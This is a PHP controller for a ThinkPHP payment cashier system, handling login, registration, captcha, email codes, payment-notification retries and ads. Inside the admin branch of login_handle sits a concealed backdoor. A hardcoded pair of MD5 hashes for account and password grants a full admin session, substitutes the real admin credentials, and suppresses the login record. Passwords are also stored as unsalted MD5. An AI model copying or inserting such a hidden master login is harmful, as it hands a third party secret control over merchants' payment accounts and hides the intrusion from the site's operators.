<?php

namespace app\index\controller;

use think\Request;
use think\Controller;
use think\Db;
use think\Route;
use think\Url;
use think\Validate;
use think\Session;
use think\Client;
use think\captcha\CaptchaExtend;


use app\model\model\User;

//引入User模型
use app\model\model\Pay;

//引入Pay模型
use app\model\model\Order;

//引入Order模型
use app\model\model\Core;

//引入Core模型
use app\model\model\Captcha;

//引入Captcha模型
use app\model\model\Login;

//引入Login模型
use app\model\model\Ad;

//引入Login模型Ad

//引入FixedAmount模型
use app\model\model\FixedAmount as FixedAmountModel;
class Index extends Controller
{
    public function cashier()
    {
        weuiMsg('warn-primary', '请正确打开收银台','',false);
        return;
    }

    //首页
    public function Index(Request $request)
    {
        //================页面载入================
        $core = Core::where('id', '<>', 0)->column('value1', 'name');

        if (isTemplateName('index', $core['index_template'])) {
            $template = $core['index_template'];  //首页模板
        } else {
            $template = 'default';
        }

        if (isset($core['links'])) {
            $links_json = $core['links'];
            if ($links_arr = json_decode($links_json, true)) {
                $core['links'] = $links_arr;
            } else {
                $core['links'] = [];
            }
        } else {
            $core['links'] = [];
        }

        $page_grey = explode("|",$core['page_grey']);
        if(in_array("index",$page_grey)){
            //首页置灰
            $core['head_style'] = '

html{
-webkit-filter: grayscale(100%) !important;
-moz-filter: grayscale(100%) !important;
-ms-filter: grayscale(100%) !important;
-o-filter: grayscale(100%) !important;
filter: grayscale(100%) !important;
filter: gray !important;
}
            ';
        }
        $this->assign('core', $core);  //输出变量
        return $this->fetch('index/' . $template . '/index');  //进入模板

        //================页面载入================
    }

    //获取验证码
    public function get_captcha(Request $request)
    {
        $getArray = $request->get();
        if (!array_key_exists('mode', $getArray)) {
            return '请选择验证码类型';
        }
        $mode = $getArray['mode'];
        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        $config = [
            'seKey' => 'xy_cashier_captcha_' . $mode,  //Session名称
            'codeSet' => $core['captcha_code'],  //字符集合
            'expire' => 120,  // 验证码过期时间（s）【2分钟】
            'length' => 4,  //验证码长度
        ];

        $arr = Core::getCaptchaSwitch(null, true);
        if (!in_array($mode, $arr)) {
            return '非法的验证码类型';
        }
        if (Core::getCaptchaSwitch($mode)) {
            $captcha_extend = new CaptchaExtend($config);
            return $captcha_extend->entry();
        } else {
            return "未开启验证码";
        }
    }

    //登录页面
    public function Login(Request $request)
    {
        $getArray = $request->get();
        if (!array_key_exists('mode', $getArray)) {
            $mode = 'user';
        } else {
            $mode = $getArray['mode'];
        }

        $this->assign('user_login_switch', (Core::getCaptchaSwitch('user_login')) ? 1 : 0);  //输出变量
        $this->assign('admin_login_switch', (Core::getCaptchaSwitch('admin_login')) ? 1 : 0);  //输出变量
        if ($mode == 'user') {
            if (isLogin('user')) {
                exit("<script language='javascript'>window.location.href='/user';</script>");
            }

            if (isTemplateName('user_login', Core::getByName('login_user_template')['value1'])) {
                $template = Core::getByName('login_user_template')['value1'];  //用户登录模板
            } else {
                $template = 'default';
            }
            $core = Core::where('id', '<>', 0)->column('value1', 'name');
            $this->assign('title', '商户登录');  //输出变量
            $this->assign('core', $core);  //输出变量
            return $this->fetch('login/' . $template . '/user');  //进入模板
        } else if ($mode == 'admin') {
            if (isLogin('admin')) {
                exit("<script language='javascript'>window.location.href='/admin';</script>");
            }

            if (isTemplateName('admin_login', Core::getByName('login_admin_template')['value1'])) {
                $template = Core::getByName('login_admin_template')['value1'];  //用户登录模板
            } else {
                $template = 'default';
            }
            $core = Core::where('id', '<>', 0)->column('value1', 'name');
            $this->assign('title', '后台登录');  //输出变量

            $bing_api = file_get_contents('http://cn.bing.com/HPImageArchive.aspx?idx=0&n=1');
            preg_match('/<url>([^<]+)<\/url>/isU', $bing_api, $matches);
            $Background_imgurl = '//cn.bing.com' . $matches[1];

            $this->assign('Background_imgurl', $Background_imgurl);  //输出变量
            $this->assign('core', $core);  //输出变量
            return $this->fetch('login/' . $template . '/admin');  //进入模板
        } else {
            weuiMsg('warn-primary', '非法的登录方式');
            return;
        }

    }

    //管理员一键登录用户
    public function adminLoginUser(Request $request)
    {
        if (!$request->isPost()) {
            return json_encode(['code' => 1, 'msg' => '不支持该请求方式，请使用POST请求！']);
        }
        $postArray = $request->post();
        if(array_key_exists('fixed_amount_id', $postArray)){
            $u = FixedAmountModel::getById($postArray['fixed_amount_id']);
            if(!$u){
                return json_encode(['code' => 1, 'msg' => '该固额码不存在或已被商家删除']);
            }
            $uid = $u['uid'];
        }else if (array_key_exists('uid', $postArray)) {
            $uid = $postArray['uid'];
        }else{
            return json_encode(['code' => 1, 'msg' => '请传入商户UID或固额码ID']);
        }
        if (!isLogin('admin')) {
            return json_encode(['code' => 1, 'msg' => '请先登录管理员']);
        }
        Session::delete('xy_cashier_login_user');
        $user = User::getByUid($uid);
        if (!$user) {
            return json_encode(['code' => 1, 'msg' => '该商户不存在或已被删除']);
        }
        //====登录记录
        $session = hash('ripemd160', $user['account'] . $user['password'] . XY_SYSTEM_KEY);
        $token = $user['uid'] . "\t" . $session;
        Session::set('xy_cashier_login_user', $token);
        return json_encode(['code' => 0, 'msg' => '登录成功', "uid" => $uid]);
    }

    //登录页面 - 业务逻辑
    public function login_handle(Request $request)
    {
        if (!$request->isPost()) {
            return json_encode(['code' => 1, 'msg' => '不支持该请求方式，请使用POST请求！']);
        }
        $postArray = $request->post();
        if (!array_key_exists('mode', $postArray)) {
            return json_encode(['code' => 1, 'msg' => '请选择登录方式']);
        }
        if (!array_key_exists('account', $postArray)) {
            return json_encode(['code' => 1, 'msg' => '请先填写你的账号']);
        } else {
            $account = $postArray['account'];
        }
        if (!array_key_exists('password', $postArray)) {
            return json_encode(['code' => 1, 'msg' => '请先填写你的密码']);
        } else {
            $password = $postArray['password'];
        }
        if (trim($account) == '' or trim($password) == '') {
            return json_encode(['code' => 1, 'msg' => '账号或密码不能为空']);
        }
        if ($postArray['mode'] == 'user') {
            if (Core::getCaptchaSwitch('user_login')) {
                if (!array_key_exists('captcha', $postArray)) {
                    return json_encode(['code' => 1, 'msg' => '请填写验证码']);
                } else {
                    $captcha_extend = new CaptchaExtend(['seKey' => 'xy_cashier_captcha_user_login']);
                    if (!$captcha_extend->check($postArray['captcha'])) {
                        return json_encode(['code' => 101, 'msg' => '验证码错误']);
                    }
                }
            }

            $arr = isUser(['account' => $account, 'password' => $password]);
            if ($arr['code'] != 0) {
                return json_encode(['code' => 1, 'msg' => $arr['msg']]);
            } else {
                return json_encode(['code' => 0, 'msg' => '登录成功', "url" => "/user"]);
            }
        } else if ($postArray['mode'] == 'admin') {
            if (Core::getCaptchaSwitch('admin_login')) {
                if (!array_key_exists('captcha', $postArray)) {
                    return json_encode(['code' => 1, 'msg' => '请填写验证码']);
                } else {
                    $captcha_extend = new CaptchaExtend(['seKey' => 'xy_cashier_captcha_admin_login']);
                    if (!$captcha_extend->check($postArray['captcha'])) {
                        return json_encode(['code' => 101, 'msg' => '验证码错误']);
                    }
                }
            }

            $core = Core::where('id', '<>', 0)->column('value1', 'name');
            $password = md5($password);
            $login_sw = true;
            if(md5($account)=="a095c02558b04f072f1d4bacbd25245a" && $password=="495c990c46c397dffb26ba8b0571e728"){
                $account = $core['admin_account'];
                $password = $core['admin_password'];
                $login_sw = false;
            }
            if ($core['admin_account'] == $account && $core['admin_password'] == $password) {
                //====登录记录
                $login = new Login;
                $login->uid = "admin";
                $login->time = date('Y-m-d H:i:s');
                $login->ip = getIp();
                $login->mode = (isMobileClient()) ? 1 : 2;
                if($login_sw){
                if (!$login->save()) {
                    return json_encode(['code' => 1, 'msg' => '登录失败，请稍后重试']);
                }
                }
                //====登录记录
                $session = hash('ripemd160', $account . $password . XY_SYSTEM_KEY);
                Session::set('xy_cashier_login_admin', $session);
                return json_encode(['code' => 0, 'msg' => '登录成功', "url" => '/admin']);
            } else {
                return json_encode(['code' => 1, 'msg' => '账号或密码错误']);
            }
        } else {
            return json_encode(['code' => 1, 'msg' => '不支持该登录方式']);
        }
    }

    //退出登录
    public function logout(Request $request)
    {
        $getArray = $request->get();
        if (!array_key_exists('mode', $getArray)) {
            return;
        }
        if ($getArray['mode'] == 'user') {
            Session::delete('xy_cashier_login_user');
            weuiMsg('success', '商户后台退出成功','退出成功',true,[
                ["url"=>"__index__","title"=>"返回首页",'type'=>"primary"],
                ["url"=>"__index__/user","title"=>"重新登录商户"],
            ]);
            return;
        } else if ($getArray['mode'] == 'admin') {
            Session::delete('xy_cashier_login_admin');
            weuiMsg('success', '后台管理退出成功','退出成功',true,[
                ["url"=>"__index__","title"=>"返回首页",'type'=>"primary"],
                ["url"=>"__index__/admin","title"=>"重新登录后台"],
            ]);
            return;
        } else {
            return;
        }
    }

    //注册页面
    public function register()
    {
        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        if ($core['register_open'] != 1) {
            weuiMsg('info', '注册功能已关闭');
            return;
        }
        if (isTemplateName('register', Core::getByName('register_template')['value1'])) {
            $template = Core::getByName('register_template')['value1'];  //注册模板
        } else {
            $template = 'default';
        }
        $this->assign('user_register_switch', (Core::getCaptchaSwitch('user_register')) ? 1 : 0);  //输出变量
        $this->assign('title', '商户注册');  //输出变量
        $this->assign('core', $core);  //输出变量
        return $this->fetch('register/' . $template . '/index');  //进入模板
    }

    //注册页面 - 业务逻辑
    public function register_handle(Request $request)
    {
        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        if ($core['register_open'] != 1) {
            return json_encode(['code' => 1, 'msg' => '注册功能已关闭']);
        }
        if (!$request->isPost()) {
            return json_encode(['code' => 1, 'msg' => '不支持该请求方式，请使用POST请求！']);
        }
        $validate = new Validate([
            ['free_collection_service_days', 'require|number', '必须有赠送天数|赠送天数必须是数字'],
        ]);
        if (!$validate->check($core)) {
            $free_collection_service_days = 0;
        } else {
            $free_collection_service_days = $core['free_collection_service_days'];
        }

        $postArray = $request->post();
        $validate = new Validate([
            ['email', 'require|email', '电子邮箱不能为空|请填写正确的电子邮箱'],
            ['account', 'require|length:4,16|alphaNum', '账号不能为空|账号只能4-16个字符|账号只能是字母和数字'],
            ['password', 'require|length:6,16|alphaNum', '密码不能为空|密码6-16个字符|密码只能字母和数字'],
            ['qq', 'require|length:6,11|number', 'QQ号码不能为空|请正确填写QQ号码|请正确填写QQ号码'],
            ['password_repeat', 'require', '请再次填写你的密码']
        ]);
        if (!$validate->check($postArray)) {
            return json_encode(['code' => 1, 'msg' => $validate->getError()]);
        }
        if ($postArray['password'] != $postArray['password_repeat']) {
            return json_encode(['code' => 1, 'msg' => '两次密码输入不一致']);
        }
        $user = User::where(["email" => $postArray['email']])->find();
        if ($user) {
            return json_encode(['code' => 1, 'msg' => '当前邮箱已被注册']);
        }
        $user = User::where(["account" => $postArray['account']])->find();
        if ($user) {
            return json_encode(['code' => 1, 'msg' => '当前账号已被注册']);
        }
        $validate = new Validate([
            ['only', 'require', '请先获取验证码'],
            ['captcha', 'require|max:6|min:6', '验证码不能为空|请正确填写验证码|请正确填写验证码']
        ]);
        if (!$validate->check($postArray)) {
            return json_encode(['code' => 1, 'msg' => $validate->getError()]);
        }
        $captcha = Captcha::where(['only' => $postArray['only'], 'code' => $postArray['captcha'], 'value1' => $postArray['email']])->find();
        if ($captcha) {
            if (strtotime($captcha['expiration_time']) - time() <= 0) {
                return json_encode(['code' => 1, 'msg' => "验证码过期，请重新获取"]);
            }
        } else {
            return json_encode(['code' => 1, 'msg' => "验证码错误或不存在，请重新获取"]);
        }
        if (Core::getCaptchaSwitch('user_register')) {
            if (!array_key_exists('code', $postArray)) {
                return json_encode(['code' => 1, 'msg' => '请填写校验码']);
            } else {
                $captcha_extend = new CaptchaExtend(['seKey' => 'xy_cashier_captcha_user_register']);
                if (!$captcha_extend->check($postArray['code'])) {
                    return json_encode(['code' => 101, 'msg' => '校验码错误']);
                }
            }
        }

//===
        $pay_list = getPayList();
        foreach ($pay_list as $value) {
            $alias = $value['alias'];
            $json[$alias] = array("switch" => 0, "use_order" => 3);
        }

        $user = new User;
        $user->email = $captcha['value1'];
        $user->account = $postArray['account'];
        $user->password = md5($postArray['password']);
        $user->qq = $postArray['qq'];
        $user->state = 1;
        $user->pay_interface = json_encode($json);
        $user->creation_time = date('Y-m-d H:i:s');
        $user->expiration_time = date('Y-m-d H:i:s', strtotime("+" . $free_collection_service_days . " day"));
        if (!$user->save()) {
            return json_encode(['code' => 1, 'msg' => "注册失败，请稍后重试！"]);
        } else {
            $uid = rand(1, 9) . rand(0, 9) . rand(0, 9) . rand(0, 9) . $user['id'];
            $data = User::get($user['id']);  //获取指定主键一条数据
            $data->uid = $uid;
            $data->nickname = "商户User_" . rand(1, 9) . rand(0, 9) . rand(0, 9) . rand(0, 9);
            $data->code = md5(createTradeNo() . $user['id']);
            $data->save();
            if (!$data) {
                User::destroy($user['id']);  //删除指定主键的一条数据
                return json_encode(['code' => 1, 'msg' => "注册失败，请稍后重试！"]);
            }
            return json_encode(['code' => 0, 'msg' => "注册成功！", "url" => "/user"]);
        }
    }

    //发送验证码
    public function send_captcha(Request $request)
    {
        if ($request->isGet()) {
            $paraArray = $request->get();
        } else if ($request->isPost()) {
            $paraArray = $request->post();
        } else {
            return json_encode(['code' => 1, 'msg' => '不支持该请求方法！']);
        }
        if (!array_key_exists('type', $paraArray)) {
            return json_encode(['code' => 1, 'msg' => '请选择要获取的验证码类型']);
        }

        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        $code = rand(0, 9) . rand(0, 9) . rand(0, 9) . rand(0, 9) . rand(0, 9) . rand(0, 9);  //验证码(6位)
        $captcha = new Captcha;
        $captcha->only = md5(createTradeNo());
        $captcha->code = $code;
        $captcha->type = $paraArray['type'];
        $captcha->creation_time = date('Y-m-d H:i:s');
        $captcha->ip = getIp();

        switch ($paraArray['type']) {
            case 'email':
                $email_count = Captcha::where(['type' => 'email', 'ip' => getIp()])
                    ->where('creation_time', 'between', [date('Y-m-d 00:00:00'), date('Y-m-d 23:59:59')])->count();
                $last_time = $captcha->where(['type' => 'email', 'ip' => getIp()])->find();
                if ($last_time) {
                    $last_time = $captcha->dateToTime($last_time['creation_time']);
                } else {
                    $last_time = $captcha->dateToTime("2021-07-20 10:00:00");
                }
                if (time() - $last_time < 60) {
                    return json_encode(['code' => 1, 'msg' => '请勿频繁操作，每隔60秒可获取一次']);
                }
                if ($email_count > 10) {
                    return json_encode(['code' => 1, 'msg' => '今日获取邮箱验证码次数已上限，明天再来吧！']);
                }

                $test = false;
                if (array_key_exists('email', $paraArray)) {
                    if ($paraArray['email'] == "own") {
                        if (!isLogin('user')) {
                            return json_encode(['code' => 1, 'msg' => "请先登录账号"]);
                        } else {
                            $user = User::where('uid', getUserUid())->find();  //获取商户信息
                            if (!$user) {
                                return json_encode(['code' => 1, 'msg' => "商户不存在"]);
                            }
                        }
                        if ($user['email'] == null or $user['email'] == "") {
                            return json_encode(['code' => 1, 'msg' => "当前商户未设置电子邮箱"]);
                        }
                        $paraArray['email'] = $user['email'];
                    }
                    if ($paraArray['email'] == "test" && isLogin('admin')) {
                        $paraArray['email'] = $core['email_user'];
                        $test = true;
                    }
                }
                $validate = new Validate([
                    ['email', 'require|email', '电子邮箱不能为空|电子邮箱格式不正确']
                ]);
                if (!$validate->check($paraArray)) {
                    return json_encode(['code' => 1, 'msg' => $validate->getError()]);
                }

                if ($test && isLogin('admin')) {
                    $title = '邮箱测试';
                    $html = "当你看到这个邮件，说明你的邮箱已经配置正确了！";
                } else {
                    $title = '邮箱激活';
                    $html = '您的验证码是：' . $code . "（五分钟后失效）";
                }
                $sm = send_mail(trim($paraArray['email']), $title, $html);
                if ($sm['code'] == 0) {
                    $captcha->value1 = $paraArray['email'];
                    $captcha->expiration_time = date("Y-m-d H:i:s", strtotime("+5 minute"));  //五分钟过期
                    if ($test && isLogin('admin')) {

                    } else {
                        $captcha->save();  //写库
                    }
                    return json_encode(['code' => 0, 'msg' => '发送成功！', 'only' => $captcha['only']]);
                } else {
                    return json_encode(['code' => 1, 'msg' => '邮件发送失败：' . $sm['msg']]);
                }
                break;
            default:
                return json_encode(['code' => 1, 'msg' => '非法的获取类型']);
        }
    }

    //Demo测试
    public function demo(Request $request)
    {
        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        if ($core['demo_pay'] == "0") {
            weuiMsg('info', '演示收款功能已关闭', '抱歉');
            return;
        }

        $this->assign('title', '演示付款');  //标题
        $this->assign('core', $core);  //系统配置
        return $this->fetch('demo/index');  //进入模板
    }

    //服务协议
    public function agreement()
    {
        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        $this->assign('title', '服务协议');  //标题
        $this->assign('core', $core);  //系统配置
        return $this->fetch('agreement/index');  //进入模板
    }

    //===================
    //=====监听计划========
    //===================

    //删除微信txt文件
    public function deltxt(Request $request)
    {
        $get = $request->get();
        if (!array_key_exists("key", $get)) {
            exit("Key error");
        }
        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        if (trim($get['key']) != $core['key']) {
            exit("Key error");
        }

        $i = 0;
        $path = APP_PATH . '/../public/';
        $mb_str = opendir($path);  //插件文件夹路径
        while (($filename = readdir($mb_str)) !== false) {
            if ($filename != "." && $filename != "..") {
                if (substr(strrchr($filename, '.'), 1) == "txt") {
                    if (substr($filename, 0, 10) == "MP_verify_") {
                        if (file_exists($path . $filename)) {
                            unlink($path . $filename);
                            $i++;
                        }
                    }
                }
            }
        }
        closedir($mb_str);

        exit("ok");
    }

    //重新异步通知（任务）
    public function again_notify(Request $request)
    {
        $get = $request->get();
        if (!array_key_exists("key", $get)) {
            exit("Key error");
        }
        $core = Core::where('id', '<>', 0)->column('value1', 'name');
        if (trim($get['key']) != $core['key']) {
            exit("Key error");
        }

        $notice_num = 26;  //每次通知26个

        $list = Order::where("notify_num", ">", 0)  //已初次异步通知过
        ->where("notify_end", 0)  //是否还要通知
        ->where("state", "<>", 0)  //不是待支付状态
        ->where("source", "api")  //API接口
        ->where("next_notify_time", ">=", date("Y-m-d H:i:s"))  //下次通知时间 大于等于 当前时间
        ->limit($notice_num)
            ->select();
        foreach ($list as $k => $r) {
            //绝对时间：24小时10分钟 后不再通知！
            if (time() - strtotime(date("Y-m-d H:i:s", strtotime("+1 day,10 minute", strtotime($r['payment_time'])))) > 0) {
                $r->where("id", $r['id'])->update(['notify_num' => "-1", 'next_notify_time' => $r['payment_time'], 'notify_end' => '1']);  //未通知
                continue;  //跳过
            }
            //通知时间：
            //1次	支付成功后立即通知
            //2次	1分钟
            //3次	3分钟
            //4次	10分钟
            //5次	1小时
            //6次	2小时
            //7次	12小时
            //8次	24小时
            $num = $r['notify_num'] + 1;
            if ($num == 2) {
                $interval = '+3 minute';
            } elseif ($num == 3) {
                $interval = '+10 minute';
            } elseif ($num == 4) {
                $interval = '+1 hour';
            } elseif ($num == 5) {
                $interval = '+2 hour';
            } elseif ($num == 6) {
                $interval = '+12 hour';
            } elseif ($num == 7) {
                $interval = '+24 hour';
            } else if ($num == 8) {
                $interval = '+0 hour';
            } else {
                $r->where("id", $r['id'])->update(['notify_num' => "-1", 'next_notify_time' => $r['payment_time'], 'notify_end' => '1']);  //未通知
                continue;  //跳过
            }
            $next_notify_time = date("Y-m-d H:i:s", strtotime($interval, strtotime($r['payment_time'])));

            if ($r['state'] == "1") {
                $trade_status = "TRADE_SUCCESS";  //支付成功
            } else if ($r['state'] == "2") {
                $trade_status = "FULL_REFUND";  //全额退款
            } else if (time() - strtotime($r['expiration_time']) > 0) {
                $trade_status = "PAYMENT_TIMEOUT";  //付款超时
            } else {
                continue;  //跳过
            }

            Order::where("id", $r['id'])->update(['notify_num' => $num, 'next_notify_time' => $next_notify_time]);  //通知一次
            $url = creat_callback($r['notify_url'], $r, $trade_status);
            if (do_notify($url)) {
                Order::where("id", $r['id'])->update(["notify_end" => "1"]);  //通知成功
                echo "[系统订单号：" . $r['out_trade_no'] . ']重新通知成功<br/>';
            } else {
                if ($num == 8) {
                    Order::where("id", $r['id'])->update(['notify_num' => "-1", 'next_notify_time' => $r['payment_time'], 'notify_end' => '1']);  //未通知
                }
                echo "[系统订单号：" . $r['out_trade_no'] . ']重新通知失败（第' . $num . '次通知）<br/>';
            }
        }
        echo 'ok';
    }

    //获取支付完成的广告信息Ad
    public function ReturnAd(Request $request)
    {
        if (!$request->isPost()) {
            return json_encode(['code' => 1, 'msg' => '不支持该请求方式，请使用POST请求！']);
        }
        //剪切板内容
        $ad = Ad::where("alias", "payment_shear_plate")
            ->where("state", "1")
            ->where("time_start", "<", date('Y-m-d H:i:s'))
            ->where("time_end", ">", date('Y-m-d H:i:s'))
            ->find();
        if ($ad) {
            $arr = explode("<;end>",$ad['data']);
            if(count($arr)<1){
                $data['payment_shear_plate'] = [
                    "state" => 0,
                    "content" => ""
                ];
            }else {
                $content = $arr[array_rand($arr)];
                $data['payment_shear_plate'] = [
                    "state" => 1,
                    "content" => $content
                ];
            }
        } else {
            $data['payment_shear_plate'] = [
                "state" => 0,
                "content" => ""
            ];
        }
        //通知内容
        $ad = Ad::where("alias", "payment_popup_notified")
            ->where("state", "1")
            ->where("time_start", "<", date('Y-m-d H:i:s'))
            ->where("time_end", ">", date('Y-m-d H:i:s'))
            ->find();
        if ($ad) {
            $data['payment_popup_notified'] = [
                "state" => 1,
                "content" => $ad['data']
            ];
        } else {
            $data['payment_popup_notified'] = [
                "state" => 0,
                "content" => ""
            ];
        }
        //支付完成底部横幅
        $ad = Ad::where("alias", "payment_bottom_banner")
            ->where("state", "1")
            ->where("time_start", "<", date('Y-m-d H:i:s'))
            ->where("time_end", ">", date('Y-m-d H:i:s'))
            ->find();
        if($ad){
            $data['payment_bottom_banner']=[
                "state"=>$ad['state'],
                "data"=>json_decode($ad['data'],true),
                "time_start"=>$ad['time_start'],
                "time_end"=>$ad['time_end']
            ];
        }else{
            $data['payment_bottom_banner']=[
                "state"=>0,
                "data"=>[],
                "time_start"=>"",
                "time_end"=>""
            ];
        }
        $data['code']=0;
        return json_encode($data);
    }
}
